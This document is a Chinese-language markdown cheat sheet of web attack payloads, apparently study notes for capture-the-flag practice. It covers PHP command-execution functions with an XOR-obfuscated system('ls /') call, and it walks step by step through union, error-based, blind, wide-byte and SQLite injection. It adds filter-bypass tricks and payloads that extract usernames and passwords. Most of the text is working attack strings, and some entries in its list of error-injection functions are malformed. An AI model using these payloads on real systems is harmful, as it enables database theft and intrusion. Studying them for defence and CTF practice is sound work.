- ### PHP命令执行函数

  **[eval](https://www.php.net/manual/zh/function.eval.php)  、assert （代码级）**

  [**system**](https://www.php.net/manual/zh/function.system.php)**、passthru、exec（无回显）、shell_exec、``（系统命令级）**

- ### PHP反序列化

  **结构、魔术方法、pop链构造**

- ### 正则匹配

  **/[A-Za-z_$\\(\\)]+/**

  **嗨正则、AI**

- ### 异或绕过

  **system('ls /')**

  ```

  ('%0C%05%0C%08%05%0D'^'%7F%7C%7F%7C%60%60')("%0C%0C%00%00"^"%60%7F%20/");

  ```

  **验证一下**

  ```

  <?php

  echo ("\x0C\x0C\x00\x00"^"\x60\x7F\x20/");

  ```

- ## SQL注入

  **sqlmap、联合注入、报错注入、布尔盲注、时间盲注、宽字节注入、堆叠注入.......**

  **通常的sql语句是$sql="SELECT * FROM users WHERE id=' 1  ' LIMIT 0,1";**

- ### **联合注入流程：**

  #### **数字型，直接注，不需要注释符**

  ```sql

  id='1 判断，看报错分析符号闭合

  id=1' or 1=1 --+  //会把所有ID列出来

  id=1' order by 3 --+ //判断当前表的列数

  id=-1' union select 1,2,3 --+  //判断回显段

  id=-1' union select 1,2,database() --+ //查当前数据库

  id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ //爆当前数据库的所有表

  id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+ //爆当前数据库users表的所有列

  id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+ //指定爆security库users表的所有列

  id=-1' union select 1,2,group_concat(`id`,':',`username`,':',`password`) from users --+  //爆当前数据库users表里id username password 列的数据 不加`也可

  ```

  **报错 Illegal mix of collations for operation 'UNION'**

  **此类问题是由于UNION Mysql的Table的时候对应的字段Collation字符序不同导致的**

  **解决方法就是在grounp前面加一个hex转一下**

  ```sql

  id=-1%0aunion%0aselect%0a1,2,hex(group_concat(table_name))%0afrom%0ainformation_schema.tables%0awhere%0atable_schema%0alike%0adatabase()

  //查当前数据库的所有表

  id=-1%0aunion%0aselect%0a1,2,hex(group_concat(column_name))%0afrom%0ainformation_schema.columns%0awhere%0atable_schema%0alike%0adatabase()%0a|| %0atable_name%0alike%0a0x73656565656563726574  

  //如果禁用了引号，那么就可以用16进制进行绕过

  ```

  **报错 Subquery returns more than 1 row**

  **在 SQL 查询中使用的子查询返回了多个结果行，而该子查询在上下文中只能返回一个单独的结果**

  **通常是在盲注的if子查询里面，涉及到直接select length(table_name)**

  **解决方法是在length前面加一个max聚合函数，因为我们只关心这表的长度而不是内容，max会返回一个最大值**

  ```sql

  action=3)%0aOR%0aIF((SELECT%0amax(length(table_name))%0afrom%0ainformation_schema.tables%0awhere%0atable_schema%0alike%0adatabase())%0alike%0a1,%0aBENCHMARK(100000000,%0a1),%0a1)%0aOR%0a(3

  ```

  -->[SQL注入](https://blog.csdn.net/qq_44159028/article/details/114325805?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170324918116800180669201%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170324918116800180669201&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-114325805-null-null.142^v96^pc_search_result_base7&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)<--

- ### **报错注入流程：（and --- 或者 union select --- 或者 or ---）**

  #### **group by 重复键冲**

  ```sql

  id=1'and/**/(select/**/1/**/from/**/(select/**/count(*),concat((select/**/database()/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand()*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)#

  //查当前数据库

  ```

  #### **updatexml() 函数**

  ```sql

  ?id=1' and updatexml(1,conncat('^',(查询语句select --- ),'^')，1) --+

  ?id=1'/**/and/**/updatexml(1,concat('^',(SELECT/**/schema_name/**/FROM/**/information_schema.schemata/**/limit/**/4,1),'^'),1)/**/#

  //查所有数据库

  ?id=1'/**/and /**/updatexml(1,concat('^',(select database()),'^'),1)/**/#

  //查当前数据库

  ?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+

  //查security数据库的表

  ?id=1'/**/and/**/updatexml(1,concat('^',(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'/**/limit/**/0,1),'^'),1)#

  //出现Subquery returns more than 1 row报错时在后面加上limint 0,1,然后依次limint 1,1 /2,1/3,1看后面几行

  ?id=1'/**/and/**/updatexml(1,concat('^',(select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='easysql'/**/and/**/table_schema='ctf'/**/limit/**/0,1/**/),'^'),1)/**/#

  //查ctf库easysql表里面的列名

  ?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1)

  //查当前数据库里面users表里面的username和password列

  ?id=1'/**/and/**/updatexml(1,concat('^',(select/**/substr(group_concat(flag),23,40)/**/from/**/easysql/**/limit/**/1),'^'),20)/**/#

  //查当前数据库easysql表里面flag列，并用substr批量读取

  ```

  #### extractvalue()函数

  ```sql

  ?id=1' and extractvalue(1,concat('^',(查询语句select --- ),'^')) --+

  ```

- ### **宽字节注入流程**

  ```sql

  ?id=%df'"

  ```

- ### **盲注流程（if的话中间可拼接 or或者and）**

  ```sql

  action=3) OR IF((SELECT LENGTH(DATABASE())) = 1, 1, BENCHMARK(10000000, 1)) OR (3

  action=3)%0aOR%0aIF((SELECT%0aLENGTH(DATABASE()))%0alike%0a1,%0a1,%0aBENCHMARK(1000000000,%0a1))%0aOR%0a(3

  //报数据库长度

  action=f'3)%0aOR%0aIF((SELECT%09mid(hex(group_concat(table_name)),%09{i},%091)%09FROM%09information_schema.tables%09WHERE%09table_schema%09like%09database())%09like%09\'{j}\',%09BENCHMARK(100000000,%0a1),%091)OR%0a(3'                                                                                                   //爆表名，结果为16进制编码    

  ```

- ### **盲注函数**

  ##### **greatest(n1, n2, n3…):返回n中的最大值 或least(n1,n2,n3…):返回n中的最小值**

  ```

  select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;

  ```

  ##### **strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1**

  ```

  select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99)

  ```

  **in关键字**

  ```

  select * from cms_users where userid=1 and substr(database(),1,1) in ('c');

  ```

  **between a and b:范围在a-b之间（不包含b）**

  ```

  select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';

  ```

  **regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配**

  ```

  Select * from cms_users where username REGEXP "admin";

  ```

  **length函数返回字符长度**

  ```sql

  select length('hello')

  // 5

  ```

  **exp函数数据溢出报错（有版本兼容问题）**

  ```sql

  select exp(~(select*from(select user())x));

  //ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'

  ```

  **纯数据溢出(mysql<5.5.53，且报错长度有限制)**

  ```sql

  select (select(!x-~0)from(select(select user())x)a);

  //ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'

  ```

  **几何函数（mysql>5.5.47 mysql<5.7.17）**

  ```sql

  select multipoint((select * from (select * from (select version())a)b));

  //ERROR 1367 (22007): Illegal non geometric '(select `b`.`version()` from ((select '5.5.47' AS `version()` from dual) `b`))' value found during parsing

  ```

  -->[报错注入](https://xz.aliyun.com/t/253?time__1311=eqIx0DyGG%3DD%3DeODBuY5AYLhQ%3DNRbD)**（另有其他方式）**<--

  -->[更多报错注入](https://cloud.tencent.com/developer/article/2160400)<--

  ```sql

  12种报错注入函数

  1、通过floor报错,注入语句如下:

  and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

  2、通过extractvalue报错,注入语句如下:

  and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

  3、通过updatexml报错,注入语句如下:

  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

  4、通过exp报错,注入语句如下:

  and exp(~(select * from (select user () ) a) );

  5、通过join报错,注入语句如下:

  select * from(select * from mysql.user ajoin mysql.user b)c;

  6、通过NAME_CONST报错,注入语句如下:

  and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c);

  7、通过GeometryCollection()报错,注入语句如下:

  and GeometryCollection(()select *from(select user () )a)b );

  8、通过polygon ()报错,注入语句如下:

  and polygon (()select * from(select user ())a)b );

  9、通过multipoint ()报错,注入语句如下:

  and multipoint (()select * from(select user() )a)b );

  10、通过multlinestring ()报错,注入语句如下:

  and multlinestring (()select * from(selectuser () )a)b );

  11、通过multpolygon ()报错,注入语句如下:

  and multpolygon (()select * from(selectuser () )a)b );

  12、通过linestring ()报错,注入语句如下:

  and linestring (()select * from(select user() )a)b );

  ```

- ### **绕过**

  #### **函数替换**

  ```sql

  sleep() -->benchmark()

     select 12,23 and sleep(1);

     select 12,23 and benchmark(10000000,1);

     //参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式

  ascii()-->hex()、bin()

        //HEX() 将字符串或数字转换为十六进制格式。

        //BIN() 将数字转换为二进制格式。

  group_concat()–>concat_ws()

       select group_concat(“str1”,“str2”);

       select concat_ws(“,”,“str1”,“str2”);

       //CONCAT_WS(separator, string1, string2, ..., stringN) 用于将多个字符串连接成一个字符串，并在每个非空值之间插      入指定的分隔符,第一个参数为分隔符

  substr()-->substring(),mid(),left(),right()

       //LEFT() 和 RIGHT() 是 SQL 函数，用于从字符串中提取从左边或右边开始的指定长度的子字符串。

       left('Hello World',5) 左侧开始读取5个字符为 hello

       注意这类函数mid(str, 1, 1)需要有空格来满足格式

  user() --> @@user、datadir-->@@datadir

  ord()–>ascii()

       //这两个函数在处理英文时效果一样，但是处理中文等时不一致。ascii会报错

  ```

  ### if绕过

  ```sql

  if函数的判断语句

  select if(substr(database(),1,1)='c',1,0);

  IFNULL函数

  select ifnull(substr(database(),1,1)='c',0);

  case when then函数

  select case substr(database(),1,1)='c' when 1 then 1 else 0 end;

  ```

  #### **等号绕过**

  **=号在某种情况下可以用< >符号来进行绕过**

  ```

  Select * from cms_users where userid>0 and userid<2;  //当参数为数字时，可用此来锁定一个1

  另外可结合ascii码来强制转为数字进行锁定

  <> 等价于 != ,所以在前面再加一个 ! 结果就是等号了

  ```

#### **空格绕过**

![46a43ec56fab4fb4bdf7a42f9b83e4a4](markdown-image/46a43ec56fab4fb4bdf7a42f9b83e4a4.png)

#### 逗号绕过

- **对于需要substr截取**

  ```sql

  select substr(database(),1,1)='c';  #等价于

  select substr(database() from 1 for 1)='c';

  ```

  **join关键字**

  ```sql

  union select 1,2,3,4;

  union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);

  union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);

  //把里面1 2 3 4替换即可

  ```

  **like关键字**

  ```sql

  select ascii(mid(user(),1,1))=80   #等价于

  select user() like 'r%'

  ```

  **offset关键字（limit，其他未知）**

  ```sql

   select * from cms_users limit 0,1;   #等价于

   select * from cms_users limit 1 offset 0;

  ```

  #### 注释符绕过

  ```sql

  --+ ，# ；

  使用单引号（’）闭合语句

  $user = 1' union select version() and '1

  结果

  $str = "select * from user where name='1' union select version() and '1' limit 0,1 ";

  ```

- ### **SQL特性**

  #### **like**

  ```sql

   Select * from cms_users where username like "ad%";

  ```

  **里面%匹配任意字符**

           **_匹配单个字符**

  **理论上可以用来进行盲注**

  -->[SQL常见绕过](https://blog.csdn.net/weixin_42478365/article/details/119300607?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170208875716800227462182%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170208875716800227462182&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-119300607-null-null.142^v96^pc_search_result_base7&utm_term=sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95&spm=1018.2226.3001.4187)<--

- ### SQLlite注入

  **鉴于SQLlite数据库的特殊性，即只有当前数据库和sqlite_master**

  ```sqlite

  'union select 1,name from sqlite_master where type='table'；--  //查表名    

  'union select 1,name FROM pragma_table_info('messages');--    //查列名

  'union select 1,sql from sqlite_master where type='table';--  //查询sql语句，可看到创建表名的sql语句，可看到里面的列名

  'order by 2--+  //查列数

  ‘union select id, title from messages where shown = true  //查列名的字段

  语句最后跟 limit 0,1 表示从第一行开始，读一行数据 limit 0,2 表示从第一行开始，读两行数据

  ```

  ```sqlite

  CREATE TABLE messages (id text primary key, title text, contents text, shown boolean)  

  //这是sqlite的创建表的语句，其中 id、title、contents、shown是列名 messages是表名**

  ```
